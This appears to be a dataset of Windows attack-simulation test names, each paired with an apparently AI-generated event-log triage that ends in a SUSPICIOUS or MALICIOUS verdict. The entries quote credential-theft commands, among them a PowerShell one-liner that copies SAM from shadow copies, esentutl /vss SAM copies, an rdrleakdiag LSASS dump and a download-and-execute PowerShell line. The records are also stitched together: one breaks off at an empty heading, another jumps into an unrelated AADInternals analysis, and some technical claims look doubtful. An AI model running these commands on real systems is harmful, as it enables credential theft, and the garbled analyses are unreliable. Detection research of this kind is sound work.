- **Conduct a comprehensive audit** of the system to look for other possible compromises or pieces of evidence that might indicate further malicious activities.
- **Ensure endpoint security solutions** are active and capable of detecting unusual PowerShell usage patterns.

### Resolution:
Based on the findings, the overall resolution for this situation is assessed as **MALICIOUS** due to the definite unauthorized access and extraction of cookie data, suggesting a breach or malicious internal activity."
esentutl.exe SAM copy,"The Windows event logs provided indicate potential indicators of suspicious activity that suggest a security incident may have occurred. Let's analyze the logs and dive into the details for clarity:

### Analysis

1. **Process Execution:**
   - Multiple executions of `esentutl.exe` are observed with the flags `/y /vss` to copy the SAM database (`C:\Windows\system32\config\SAM`) to a temporary location (`%temp%/SAM`). This action is indicative of accessing or duplicating the Security Accounts Manager (SAM) database, which can signify an attempt to extract credentials.

2. **Administrative Privileges:**
   - The logs indicate that the user `admin_test` on `SERVER002` ran these potentially malicious commands with high integrity level, suggesting administrative privileges.

3. **Credential Dumping:**
   - The use of `esentutl.exe` with the parameters to interact with the SAM file and `Volume Shadow Copy Service (VSS)` to bypass file locks is often associated with credential dumping techniques used by attackers to extract sensitive data, such as password hashes.

4. **User and Privilege Activity:**
   - The user account `admin_test` logs in with elevated tokens and several high-level privileges (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.), consistent with actions that require high privilege, such as those involved in credential dumping.

5. **Volume Shadow Copy Service (VSS) Activity:**
   - The execution of `VSSVC.exe` is noted alongside `esentutl.exe` to likely facilitate the SAM file copying without filesystem restrictions. Such actions are categorized as shadow-copy-based credential dumping techniques.

### Assessment

Given the above findings, the behavior exhibited by the logs suggests steps consistent with credential dumping, a common tactic used in initial stages of lateral movement within an environment. The endeavor to duplicate SAM database contents through the manipulation of Windows services points towards a malicious activity specifically directed towards gaining unauthorized access to sensitive credential information.

### Resolution

**MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Action:**
   - Isolate the affected host (Server002) to prevent further propagation of potential attack vectors.
   - Reset credentials related to `admin_test` and other associated accounts on the server.
   
2. **Forensic Investigation:**
   - Conduct a full forensic analysis on Server002 to determine how credentials were initially compromised.
   - Evaluate network activity around the time of observed events to identify other compromised hosts or potential exfiltration points.

3. **Post-Incident Recovery:**
   - Determine if sensitive information was exfiltrated or altered.
   - Ensure systems are patched and security configurations adhere to best practices.

   - Recommendations include evaluating the source and intent behind the PowerShell command, checking if `admin_test` had legitimate reasons to access these credentials, and exploring any potential unauthorized usage of credentials obtained."
Brute Force Credentials of single Active Directory domain user via LDAP against domain controller (NTLM or Kerberos),"### Detailed Analysis:

#### 1. Security Log:
- **Event ID 4616 (Time Change):** The security log indicates a time change made by the `svchost.exe` process running under the `LOCAL SERVICE` account. The `NewTime` is set before the `PreviousTime`, suggesting that the system time was manually set back by a small margin.
  
#### 2. Windows PowerShell Log:
- **Brute Force Script Execution:** The PowerShell logs reveal the execution of a script designed to brute force passwords for NTLM authentication. The script reads from a list of passwords (`passwords.txt`) in the user's temporary directory and attempts to bind to an LDAP connection with each password. This indicates a potential credential attack attempt using PowerShell.

#### 3. Sysmon Log:
- **Process Execution:**
  - Multiple use of `wevtutil.exe` linking to the `admin_test` account. This can be part of legitimate activity, but in conjunction with other logs, it may indicate log manipulation or clearing.
  - **PowerShell Execution:** A corresponding PowerShell execution is recorded in Sysmon, confirming the script's attempt for brute forcing as shown in the PowerShell logs.
  
#### 4. System Log:
- **Event IDs related to Time Change:** System logs show similar time manipulation corresponding with the Security logs, confirming the suspicious time change.

#### 5. Application Log:

Dump LSASS.exe Memory using NanoDump,"Based on the provided Windows event logs from the system ""Server002"", I have conducted a detailed analysis, isolating various log entries to discern any indicators of potential malicious activity.

### Observations:

1. **Powershell Usage:**
   - The execution of `powershell.exe` is noted with the user `SERVER002\\admin_test`. The usage of PowerShell is not necessarily suspicious, but if this activity is unexpected for the user `admin_test`, it could be an indicator worth further analysis.

2. **Frequent Execution of System Utilities:**
   - Multiple executions of `wevtutil.exe` (used for Windows Event Log management) are detected within short intervals. This could be considered suspicious, especially if there are no legitimate administrative tasks needing event log queries or manipulations by `SERVER002\\admin_test`.

3. **Execution of `CMD.EXE`:**
   - The command line execution `\""cmd.exe\"" /c C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\script.x64.exe -w \""%temp%\\script.dmp\""` stands out. The use of `cmd.exe` to run an executable from the AppData temp directory, along with relative path navigation `..`, may indicate an attempt to execute a potentially harmful script or application. The context for such execution, particularly from a temp location, is often associated with malicious activity or intrusion attempts.

4. **Emulation Layer Warning:**
   - An entry in the Application log shows activity from the Wow64 Emulation Layer regarding the script.x64.exe. This might suggest attempts to run a script under compatibility settings for potential cross-architecture execution, raising concerns, particularly if not a routine part of system operations.

### Assessment:

- **Suspicious Activities:**
  - The execution of `script.x64.exe` from a Temp directory, indicated by both the Sysmon and Application logs, is highly unusual and aligns with tactics often used in malicious operations to obfuscate or discretely execute code.
  - The heavy use of system utilities (`wevtutil.exe`, `cmd.exe`) within a tight timeframe could suggest an attempt to modify, delete, or cover tracks in the event logs, which is typical of a compromise strategy.

### Conclusion:

Given the combination of unusual system utilities usage patterns and the execution of potentially unauthorized scripts from a user profile's temporary directory, the logs point toward activities that are not typical under normal, benign operations, especially without a clear authorized context or requirement.

**Resolution:** SUSPICIOUS

### Recommendations:

- **Further Investigation:** Conduct a comprehensive review of the `admin_test` user’s activities and verify if such actions are consistent with their role.
- **Forensic Analysis:** Retrieve the `script.x64.exe` file for a detailed malware analysis to identify if it poses a risk.
- **System Monitoring:** Increase monitoring on `Server002`, focusing on script executions and administrative process activities.

Send NTLM Hash with RPC Test Connection,"Based on the provided Windows event logs, a comprehensive analysis reveals the following:

### Indicators of Suspicious or Anomalous Behavior:

1. **Repeated Use of wevtutil.exe**:
   - There are multiple instances of `wevtutil.exe` being executed by a user `SERVER002\\admin_test`. `wevtutil.exe` is a legitimate tool used to manage event logs. However, frequent execution in quick succession could indicate tampering or clearing event logs to cover tracks after malicious activity.

2. **PowerShell Activity**:
   - There's a notable PowerShell execution with the command `rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null`. The use of `rpcping` in such a manner might be attempting to test or manipulate RPC configurations, potentially for lateral movement or data exfiltration. This action and its associated PowerShell command-line usage require further investigation.

3. **Execution of HOSTNAME.EXE and WHOAMI.EXE**:
   - Both `HOSTNAME.EXE` and `WHOAMI.EXE` were executed shortly after each other. While these are benign system utilities, they are often used in reconnaissance to gather network and user information. Their presence, particularly in this sequence, could be part of a discovery phase by an attacker.

4. **Security Logs 5379 Events**:
   - The logs captured indicate access or enumeration failures related to a user trying to manipulate or gather credential information. The return code `3221226021` generally suggests access that has been denied or similar.

### Assessment and Conclusion:

The logs present several patterns that are suspicious:

- **The rapid invocation of tools like `wevtutil.exe`, `rpcping`, and common discovery utilities (e.g., `whoami.exe`) suggests a script or workflow potentially testing or manipulating system capabilities.**
- **Unusual usage of Intricate PowerShell commands implies either a very knowledgeable user or an automated/scripted activity.**
  
### Resolution:

Given these observations, the resolution would be:

- **SUSPICIOUS**: The activities recorded do not clearly confirm a compromise, but they do hint towards potential unwanted activity that should be investigated further. It is advisable to:
  - **Perform a thorough examination of the server** to check for any additional indicators of compromise, especially focusing on activities by the `admin_test` user.
  - **Correlate with network logs** to see if there was any unusual network activity at the time of these logs.
  - **Consult with the user or team responsible for `SERVER002\\admin_test`** to verify if the actions were legitimate or sanctioned for maintenance purposes.

Create Volume Shadow Copy remotely with WMI,"### Detailed Analysis

Upon reviewing the provided Windows event logs, several points of interest have been identified that could signify potential anomalies:

#### Security Log Analysis

- **Event ID 4904 and 4905**: These events are related to the Microsoft Volume Shadow Copy Service (VSS). The execution of `C:\Windows\System32\VSSVC.exe` is standard in system operations, especially for backups. No immediate anomalies detected here.

- **Event ID 5379**: Repeated log entries indicating a failed credential operation, specifically targeting `MicrosoftAccount`. The error return code `3221226021` often indicates a status not found or logon failure. This could imply a potential failed access attempt or misconfiguration.

#### Sysmon Log Analysis

- **Process Creation and Execution (Event ID 1)**: 
  - `cmd.exe` usage with shadow copy operations (`wmic /node:""localhost"" shadowcopy`) stands out. While legitimate under administrative circumstances, the usage of shadow copies can be associated with data exfiltration or ransomware preparation tactics, especially given the high integrity level and the actions being listed for `shadowcopy create`.
  - `whoami.exe` and `hostname.exe` are often used for reconnaissance. Their usage can indicate an initial access phase or lateral movement attempt.

- **Event ID 5 (File Creation Time Changed)**:
  - Multiple entries regarding the use of `wevtutil.exe` which manipulates event logs. This could potentially signify attempts at tampering with logs or covering tracks.

#### Application Log Analysis

- A single entry indicating that Windows Defender is enabled and operational (`SECURITY_PRODUCT_STATE_ON`), which is generally a positive indicator for system defense.

#### System Log Analysis

- Windows Update activities related to security intelligence updates for Microsoft Defender. These updates are necessary for protection against threats, though their presence alone doesn't imply malicious activity.

### Assessment

Upon holistic analysis of the logs and taking into account the mentioned operations and activities, the situation is assessed as:

- **Resolution: SUSPICIOUS**

### Rationale

The repeated failed login attempts could signal an automated or programmatic effort to leverage credentials. The presence of commands interacting with shadow copies (`wmic shadowcopy`) and event logs (`wevtutil`) could indicate preparation for maintaining persistence or covering tracks, common techniques employed during compromised scenarios. While these activities could also align with certain administrative processes, when combined, they merit further investigation.

### Guidance

1. **Investigate the Accounts**: Verify if the ""admin_test"" account was active or if it was used without consent. Analyze any recent changes or logged activities related to this user.
   
2. **Review and Cross-Reference**: Collect more logs for the timeframe of suspicious activities, especially around the wmic and wevtutil executions, including network logs or anything indicating data exfiltration.
   
3. **Network Segmentation & Monitoring**: If not already in place, consider isolating affected systems pending resolution and increase monitoring on the systems flagged with these abnormal activities.
   
4. **Patch and Update**: Ensure that the system is fully patched and up-to-date with security updates, as indicated by the logs, especially regarding defender updates.

5. **Investigate Log Tampering**: Analyze the event logs to ensure they have not been tampered with. Ensure audit logging is intact and evaluate the scope of log manipulation activities.

Determine if any unauthorized software installations or configurations have been carried out and respond accordingly. Proceed with corrective measures and potentially, a forensic analysis to fully understand the scope, should these activities persist or worsen."
Dump LSASS.exe Memory through Silent Process Exit,"After examining the provided Windows event logs, I have identified several areas of interest that warrant further analysis:

1. **Wow64 Emulation Layer Event in the Application Log**:
   - The log entry involves the execution of a file located in a temporary directory: `\\??\\C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\script.x64.exe`. Execution of scripts or executables from a temporary directory can be considered suspicious as it deviates from normal behavior, particularly if these locations are commonly exploited for malicious practices. However, this entry alone does not confirm malicious activity without additional context.

2. **Sysmon Logs Analysis**:
   - **Microsoft Edge Installer Execution**: Multiple entries (EventRecordID: 17933, 17964) detail the execution of a Microsoft Edge update process, which appears to operate legitimately, running as part of a scheduled or manual update.
   - **Powershell Execution**: Notably, there is a Powershell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) under the user `SERVER002\\admin_test`. While the use of Powershell can be legitimate, in combination with other suspicious activities, it may represent a security risk, especially if involved in scripting automation that can be leveraged by bad actors.
   - **Frequent Execution of `wevtutil.exe` and `conhost.exe`**: Commands like `wevtutil.exe` are involved in retrieving or managing Windows Event Logs, and frequent use may indicate log clearing attempts or manipulation. This could suggest an attempt to hide malicious activities or tracks.
   - **Execution of `cmd.exe` Leading to `script.x64.exe`**: The chain of execution observed here is concerning. `cmd.exe` executed a script from a temporary directory with command-line arguments such as `--silent-process-exit`. This can suggest attempts to quietly run processes possibly linked to malicious tasks.

3. **Miscellaneous**:
   - The `whoami.exe` and `hostname.exe` process executions appear benign as standalone actions. However, if connected to the aforementioned suspicious activities, they might contribute to a narrative of privilege escalation or reconnaissance attempts.

**Assessment & Resolution**:

- **SUSPICIOUS**: The logs contain activities requiring further analysis. Specific points include the execution context and command-line arguments of `script.x64.exe`, the repeated use of `wevtutil.exe`, and the overall process chains suggesting a potential attempt at stealthy script execution. Analysis should focus on the origin of `script.x64.exe` and validate permissions and signatures if applicable. Additionally, assessing user activity for accounts like `admin_test`, potential remote connections, and any correlated alerts in network monitoring systems is prudent.

**Guidance**:
- **Immediate Response**: Quarantine any files flagged as suspicious if possible and investigate the timeframe for correlated network or other endpoint activities.
- **Forensic Imaging**: Preserve evidence by capturing memory and disk images before further forensic inspection.
- **Enhanced Monitoring**: Heighten monitoring on temporary directories and processes like `cmd.exe` and Powershell that may be leveraged for unauthorized activities.

Further investigation is necessary to classify the event as definitively benign or malicious, with recommendations to involve security operations or incident response to verify and mitigate if threats are confirmed."
Dump LSASS.exe Memory using Out-Minidump.ps1,"Upon analyzing the Windows event logs provided, there are indications of potentially malicious activity. Below is a detailed analysis:

1. **Suspicious PowerShell Activity**: 
   - There is a recorded execution of PowerShell with a complex command that involves:
     - Modifying `Net.ServicePointManager` settings which could be an attempt to manipulate security protocols.
     - Using `Invoke-Expression` (`IEX`) to execute a script directly from the internet (from a GitHub URL). This is a classic indicator of a PowerShell-based attack, potentially downloading and executing malicious scripts.
     - Accessing the `lsass` process using the `Get-Process` cmdlet, which is often targeted in attempts to dump credential information.

2. **Execution of `wevtutil.exe` and `conhost.exe`**:
   - Multiple instances of executions of `wevtutil.exe` and `conhost.exe` under the same user (`SERVER002\\admin_test`) in quick succession. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, its misuse could indicate attempts to clear logs, a common tactic to cover tracks of malicious activity.
   - `Conhost.exe` instances may be part of normal operations but are appearing sequentially alongside `wevtutil.exe` events which raises concerns about automated scripting or elevated operations.

3. **High Integrity Processes**: 
   - Processes like `whoami.exe` are being run at 'High' integrity levels, suggesting administrative level operations. While `whoami.exe` is a legitimate tool, in conjunction with suspicious PowerShell script executions, it could be part of a reconnaissance effort by an attacker.

**Assessment:**

- **Windows PowerShell logs and Sysmon logs reveal** a PowerShell process being executed with potentially harmful intentions, particularly due to the execution from a URL and involving a script execution without comprehensive error handling.
- Identity escalation or misuse of administrative rights seems possible due to the elevated operations.
- The combination of these actions suggests a campaign where an attacker might be leveraging PowerShell for compromising operations such as downloading further malicious payloads and potentially gathering credentials.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment**:
   - Investigate and isolate the source machine (Server002) to prevent any potential lateral movement.
   - Terminate any suspicious PowerShell and any unknown active processes.

   - Importing modules like AADInternals is notable as it provides capabilities that can interact with Active Directory Federation Services, potentially extracting sensitive data or manipulating configurations.

2. **Sysmon Logs on Process Execution:**
   - Multiple instances of PowerShell, `wevtutil.exe`, `conhost.exe`, and other processes like `whoami.exe` and `hostname.exe` were executed by the user `SERVER002\admin_test`.
   - Particular attention is called to the PowerShell process because it executed the same script referenced in the PowerShell logs with elevated permissions (High integrity level).
   - The presence of these processes suggests command execution possibly tied to scripting activities, which aligns with the suspicious PowerShell module usage.

3. **Edge Update Activity:**
   - Several processes related to the Microsoft Edge Update were observed. These include installers and setup instances executed by the `NT AUTHORITY\SYSTEM` user with system-level integrity. 
   - These activities seem routine concerning software updates but require verification to ensure these updates were scheduled, expected, and legitimate.

### Threat Assessment:

**Suspicious Activity:**
- The PowerShell execution with the AADInternals module to retrieve ADFS certificates could represent reconnaissance activity or an attempt to exploit configuration or credentials. Moreover, this aligns with activity typical of a threat actor engaging in data exfiltration or credential dumping.
- Additionally, while there is no direct evidence of malware, the extensive use of high-integrity processes and potential automation (as seen with multiple `wevtutil.exe` and `conhost.exe` instances) could imply further scripted activities or attempts to evade detection.

**Resolution: SUSPICIOUS**
- The actions noted are suspicious due to the critical nature of the data and roles accessed (particularly centralized within AD environments). More investigation is needed to ensure these activities are executed legitimately by authorized personnel.
  
### Recommendations:
1. **Immediate Validation:**
   - Confirm whether the use of AADInternals and the retrieval of ADFS certificates were planned or authorized as part of administrative activities or testing scenarios.
   
2. **Review User Access:**
   - Check the access and roles associated with the user `SERVER002\admin_test` to ensure no unnecessary privileges are granted.

3. **Log Correlation:**
   - Correlate the PowerShell activity with network logs to identify any data exfiltration attempts when certificates were exported.

4. **Monitor and Alert:**
   - Implement detections for similar PowerShell usage, particularly for sensitive module imports and command executions across other hosts. 

5. **Audit Software Updates:**
   - Verify the legitimacy of Microsoft Edge updates to confirm no malicious software updates were attempted as a form of attack.

Further investigation will clarify whether these activities are benign administrative tasks or indicative of unauthorized access or information exfiltration."

Password Spray Invoke-DomainPasswordSpray Light,"### Analysis of Logs:

#### Suspicious Behavior:

1. **PowerShell Execution**:
   - There is a recurring execution of `powershell.exe` with a script that appears to be attempting password enumeration using the `Invoke-dpsLight` function. The command:
     ```plaintext
     powershell.exe & {function Invoke-dpsLight ($Password, $userlist) {...}}
     ```
     - Attempts to check passwords against a user list in an LDAP domain, displaying when a correct password is found: `Password found for User:$User Password:$Password`.
     - This behavior is highly indicative of password spraying or brute force attempts using PowerShell script, which is a common tactic in cyber attacks.

2. **Process Creation**:
   - Numerous instances of `wevtutil.exe` and `conhost.exe` running in close succession observed. `wevtutil.exe` is often used to query or clear event logs, potentially indicative of an attempt to cover tracks by removing logs.
   - The repetitive and clustered nature of process creation (e.g., frequent `conhost.exe` processes) alongside suspicious PowerShell activity adds to the suspicion.

3. **Usage of System-Level Commands**:
   - Commands like `hostname.exe` and `whoami.exe` are often used in reconnaissance to gather system and user information.

4. **Integrity Level**:
   - Many processes are running at a high integrity level (indicating admin privileges), suggesting potential privilege escalation.

5. **Edge Update Processes**:
   - A significant number of `MicrosoftEdgeUpdate.exe` processes are running, which in isolation might appear normal, but their sheer volume could indicate something irregular.

6. **Service and Process Termination**:
   - The PowerShell engine appears to start and stop multiple times (`EventID 600` and `EventID 403`), suggesting potential automated execution of scripts that are started and stopped programmatically.
   
### Conclusion:

- **Current Indicators**: The presence of highly suspicious PowerShell scripts attempting password enumeration and repeated system-level reconnaissance commands suggest potential malicious activity.
- **Potential Risk**: Unauthorized access and lateral movement within the network could be occurring, aiming to capture admin credentials and maintain persistence.
- **Evaluation**: Based on the evidence of credential-related scripts and potential log tampering tools being executed, the activity is strongly suspicious of malicious intent.

LaZagne - Credentials from Browser,"### Detailed Analysis of the Logs

**Suspicious/Anomalous Behavior:**
1. **Command Line Execution and Elevated Commands:**
   - The execution of **cmd.exe** with a command line pointing to a temporary file directory (e.g., `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\script.exe"" browsers`) is suspicious. This behavior often indicates scripting or command execution to perform actions that aren't standard for application installations or updates. The script executed may be involved in potentially unwarranted activities.

2. **Frequent Use of Administrative Processes:**
   - Multiple instances of **wevtutil.exe** (used for managing event logs) and **conhost.exe** executing under the ""SERVER002\admin_test"" user can indicate an abnormal pattern or scripting. This can be used to clear logs or execute commands in a concealed manner if not properly justified.

3. **PowerShell Usage:**
   - **PowerShell** activity with **admin_test** as the user, without detailed command line arguments, raises red flags as it's a known vector for various malicious exploits. PowerShell is a powerful scripting tool often leveraged by attackers due to its flexibility and capability to bypass certain security restrictions.

4. **Execution of System Utilities:**
   - The use of **whoami.exe** and **hostname.exe** may indicate an attempt to profile the system environment. While not directly malicious, these are typically used in scripting environments for enumeration.

5. **Repetitive Credential Enumeration:**
   - Logs show entries for **event 4798** which indicate attempts to enumerate credentials/accounts (e.g., admin_test, Administrator). While not necessarily malicious, the frequency might represent a scanning or reconnaissance behavior, suggesting the system is being probed for vulnerabilities or information.

**Potential Malicious Indicator:**
- Execution of non-standard Microsoft utilities such as **RUXIMICS.exe** and frequent invocation by **PLUGScheduler.exe**. Although these utilities could be benign under specific circumstances, the unusual frequency and pattern of execution could suggest they are being used in a non-standard capacity, potentially as part of a payload delivery or consented agreement infrastructure.

### Assessment of the Situation

**Security Implications:**
- The presence of frequent script executions and processes under administrative privileges alongside enumerative activities bears signs of potentially malicious reconnaissance, lateral movement, or preparation for execution of scripts or malware payload in the environment.
- The use of **cmd.exe** with scripts in the path dramatically increases the chance of malicious activity, especially when run from temporary directories.

### Resolution and Guidance

- **Resolution**: **SUSPICIOUS**
  - **Rationale**: While not explicitly confirmed as malicious, the combination of factors—especially the script execution from a non-standard directory and numerous entries of administrative privilege usage—requires further investigation to rule out potential threats.

**Recommended Next Steps:**
1. **Deep-Dive Analysis**:
   - Investigate the full command-line arguments of PowerShell and cmd.exe executions. Identify all scripts being executed from temporary directories.
   - Analyze script contents in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.003\bin\script.exe` if accessible.

2. **User Account Monitoring**:
   - Monitor and audit activities under the ""admin_test"" account for any unauthorized or unusual actions, especially those that mimic elevated command executions.

3. **Security Tool Measures**:
   - Utilize endpoint protection and threat hunting tools to scan for anomalies related to the processes identified.
   - Consider implementing additional logging policies to capture more detailed process and command information.

4. **Environment Hardening**:
   - Restrict PowerShell and cmd.exe from being used to execute from temporary directories without explicit authorization.
   - Apply application whitelisting to prevent unknown or untrusted scripts from executing.

By taking these measures, you can reduce potential risks and better protect the environment against current and future threats."
WinPwn - Loot local Credentials - lazagne,"Based on the provided event logs, a comprehensive analysis reveals several activities that should be prioritized due to their potentially suspicious nature. Here's a detailed analysis:

1. **PowerShell Activity:** 
   - Numerous PowerShell log entries show a script being downloaded and executed from an external URL (`https://raw.githubusercontent.com/script/script/121dcee26a7aca368821563cbe92b2b5638c5773/script.ps1`). This activity is concerning because:
     - PowerShell is often leveraged as a tool for malicious activities due to its powerful scripting capabilities.
     - Downloading scripts from an external source and executing them may imply the execution of unauthorized or potentially malicious code.
   
2. **Sysmon Log Activity:** 
   - This script download via PowerShell is corroborated in the Sysmon logs, which document the execution of `powershell.exe` with arguments consistent with downloading and executing a script via `Invoke-Expression (iex)`. This is a known technique used in attacks.
   - The sequence of processes involving `wevtutil.exe`, `conhost.exe`, and `HOSTNAME.EXE` is not inherently malicious but may indicate actions related to event log manipulation or exploration, which should be explored further if context is lacking.
   - Execution of `whoami.exe` for user identification could be part of a reconnaissance activity which, by itself, is not necessarily malicious but useful in the context of staging attacks.

3. **Edge Update Processes:**
   - Multiple entries associated with Microsoft Edge Update processes running with NT AUTHORITY\SYSTEM privileges are seen. While these automated update actions are not inherently suspicious, they provide a backdrop of activities that could mask other processes if hijacked.

4. **Security Log and Kernel Events:**
   - The change in system time logged in the Security and System logs via `svchost.exe` by LOCAL SERVICE does not appear inherently malicious. Time adjustments can occur due to synchronization with an external time source. However, if not expected, it should be corroborated with scheduled tasks or time settings.
 
### Summary and Recommendations:
- **Resolution: SUSPICIOUS**
  - The PowerShell activity, especially the external script loading, stands out as particularly indicative of potentially hostile actions. Although the Sysmon logs and application logs suggest typical system update processes, the PowerShell invocation should be scrutinized.
  
- **Next Steps:**
  - Verify the source and authenticity of the PowerShell script loaded from `raw.githubusercontent.com`.
  - Conduct a threat intelligence search on the URLs and commands used in the PowerShell execution to ascertain known bad actors.
  - Analyze network traffic around the event’s time frame to determine if there was any unexpected data exfiltration or further command-and-control communication.
  - Review system integrity and ensure all PowerShell logging features are enabled for continuous monitoring.
  - Validate the legitimacy of the Edge Update processes and any other high-integrity actions within the logs.
  
This initial investigation requires prompt additional inquiry and potentially quarantining the affected host until further verification of activity integrity can be completed."
PowerShell - Prompt User for Password,"Upon analyzing the provided logs, several elements stand out that raise potential security concerns:

1. **PowerShell Execution with Obfuscated Commands:**
   - Within the Sysmon and PowerShell logs, there are multiple instances of PowerShell being executed with command lines that suggest circumventing typical usage. For example, one PowerShell command `(EventID: 600, Timestamp: 2024-10-22 18:52:12.743)` involves prompting for the user's credentials using `PromptForCredential`, which raises immediate red flags, especially when paired with writing warnings to expose passwords.

2. **Processes Initiated by PowerShell:**
   - The PowerShell script executed `whoami.exe`, `conhost.exe`, `wevtutil.exe` from elevated integrity levels, which is a common practice in process injection or persistence mechanisms in an attack.

3. **Miscellaneous Executions:**
   - Multiple executions of `wevtutil.exe` were found. While this tool is legitimate for managing Windows Event logs, it is often used maliciously to clear logs or extract them. The high frequency in conjunction with elevated privileges carries suspicious intent.

4. **Unusual Network Activity:**
   - Security logs show weird credential access attempts with entries for failed credential reads, particularly Event ID 5379 entries, showing potential unauthorized credential access attempts.

5. **Privilege Escalation:**
   - The logs include Event ID 4672, which highlights special privilege assignments, indicating a pattern where a process attempts to exploit elevated privileges.

6. **System Time Changes:**
   - Unexpected time changes (Security log EventID 4616) without clear reasons, possibly indicating an attempt to tamper logs for anti-forensics.

Given the combination of these factors and the specific patterns observed:
- PowerShell scripts prompting for password inputs and writing passwords to console.
- Frequent use of tools like `whoami` and `wevtutil` with system privileges.
- Repeated unauthorized attempts to access credentials.

Based on these observations, I conclude the resolution for this analysis is:

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected system to prevent further malicious activity or data exfiltration.
- Conduct a wide-scale forensic investigation to trace the source, investigate the breach further, and determine the full extent of the compromise.
- Reset all credentials associated with the system and consider implementing Multi-Factor Authentication (MFA).
- Review the system's configurations and security policies to enhance defenses against similar threats in the future.
- Engage with incident response experts if needed, to handle the current breach and protect against future incidences."
List Credential Files via Command Prompt,"Detailed Analysis:

1. **Application Log:**
   - The application log entries indicate the stopping of the 'edgeupdate' service, which is normal behavior as services may start and stop for updates or maintenance. This alone does not imply any malicious intent.

2. **Security Log:**
   - Events 4616 are related to time change or setting events within the system and are usually logged for system-level changes like daylight savings adjustments. The logs do not present any anomalous subject user details, as the changes are executed by ""NT AUTHORITY\SYSTEM"", which is normal.

3. **Sysmon Log:**
   - The logs reveal frequent execution of processes such as `wevtutil.exe`, `conhost.exe`, and `wevtutil.exe`, again by a user `SERVER002\admin_test`. These activities could relate to legitimate administrative tasks, especially if `admin_test` is a known admin user.
   - The execution of `cmd.exe` with a command `/c dir /a:h` targeting potential credential paths is potentially suspicious. Access to hidden directories within `AppData\Local\Microsoft\Credentials` could imply an attempt to locate credential data.
   - Multiple instances of Microsoft Edge Update processes are seen, with consistent updates and registrations occurring, which indicates normal software update activities from Microsoft Edge Update.

4. **System Log:**
   - System logs show time adjustments likely related to synchronization with time.windows.com; this is typical behavior in a domain setting for time corrections and does not exhibit malicious characteristics.

Conclusion:

Based on the analysis of the logs, certain actions, such as the command to view hidden directories, are suspicious. However, these actions alone are not definitive proof of malicious intent without additional context, such as unauthorized privilege escalation or unknown or unauthorized users performing these actions.

Resolution: **SUSPICIOUS**
- The observed command in the Sysmon log warrants further investigation to ensure it aligns with authorized activities by legitimate users. It might be prudent to confirm whether `admin_test` performed these actions intentionally and whether the 'cmd.exe' command was expected for their tasks.
​​
Guidance on How to Proceed:
- Verify the identity and privileges of the user `SERVER002\admin_test`.
- Check for any known incidents involving credential access using context from the user or related systems.
- Implement tripwires or further monitoring on suspicious directories accessed via the `cmd.exe` command.
- Review access and modification details for files within `AppData\Local\Microsoft\Credentials`.

This case should be investigated further to rule out any unauthorized access or attempts at credential compromise."
dump volume shadow copy hives with System.IO.File,"Upon analyzing the provided Windows event logs for the host Server002, several suspicious behaviors have been identified:

### Summary of Findings:

1. **PowerShell Activity:**
   - A suspicious PowerShell script is attempting to copy the Security Account Manager (SAM) database using volume shadow copies: `powershell.exe & {1..10 | % { try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\SAM"", ""$env:TEMP\SAMvss$_"", ""true"") } catch {}} ls ""$env:TEMP\SAMvss$_"" -ErrorAction Ignore}`
   - The SAM file contains hashed passwords and other sensitive information. This activity is commonly associated with attempts to extract user password hashes for potential unauthorized access.

2. **Security Logs and Suspicious Privilege Escalation:**
   - Logon events for the user `admin_test` show escalated privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc.) which are often necessary for malicious activities such as credential dumping or system manipulation.
   - The user `admin_test` received multiple logon type 3 (network logon) events in quick succession, which could indicate an automated process or script being executed on behalf of the user.

3. **Time Stomping Indications:**
   - Kernel-General events reveal manipulations of system time.
   - Changing the timestamps can be employed to obstruct forensic analysis and correlate suspicious events.

4. **Sysmon Observations:**
   - Numerous executions of PowerShell and utilities such as `wevtutil.exe` and `conhost.exe`, which align with the patterns of system enumeration and potential exploitation.
   - Frequent usage of system utilities without explicit system maintenance activities or updates that could justify their execution.

Dump LSASS.exe using lolbin rdrleakdiag.exe,"### Analysis:

1. **PowerShell Activity**: 
   - The PowerShell logs indicate the execution of a script that checks the presence of `rdrleakdiag.exe` in either `System32` or `SysWOW64` directories. The following actions are carried out if the file is found:
     - It identifies the process ID of `lsass.exe` using `Get-Process lsass`.
     - It attempts to create a directory in the TEMP folder named `data-rdrleakdiag`.
     - It uses `rdrleakdiag.exe` to perform a full memory dump of the `LSASS` process.
   - **Concern**: Dumping `LSASS` memory is commonly associated with credential dumping by attackers. The presence of `rdrleakdiag.exe`, typically Microsoft’s diagnostic tool, being scripted this way without a legitimate reason is suspicious and is a known technique for attackers to dump credentials.

2. **Security Logs**: 
   - **Logon Events**: 
     - Event ID 4624 indicates a successful logon. The logon type 3 suggests a network logon.
     - Event ID 4634 indicates a logoff, which seems normal.
   - **Privilege Escalation**:
     - Event ID 4672 indicates special privileges assigned to a new logon with high-privileged rights like `SeDebugPrivilege`.
   - **Concern**: The use of network logons in conjunction with special privileges could indicate anomalous behavior if these privileges are abused.

3. **Sysmon Activity**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` by the user `admin_test`.
   - The execution of `whoami.exe` and checking the hostname using `hostname.exe` suggests someone is gathering system information.
   - **Concern**: The execution of these tools in a short timeframe could suggest a reconnaissance phase by an attacker but could also be legitimate administrative tasks.

### Assessment:

There is potential malicious activity indicated in these logs due to the actions taken with `PowerShell` relating to `LSASS` memory dumping. These activities could be associated with lateral movement or credential harvesting within a network by a threat actor. The behavior around privilege escalation and information gathering further align with common adversarial techniques.

### Recommendation:

- **Resolution**: **MALICIOUS**
  - This pattern of behavior—gathering `LSASS` memory dumps, privilege escalation, and system interrogation—warrants immediate action.
- **Immediate Actions**:
  - Isolate the affected host from the network to prevent further spread or data exfiltration.
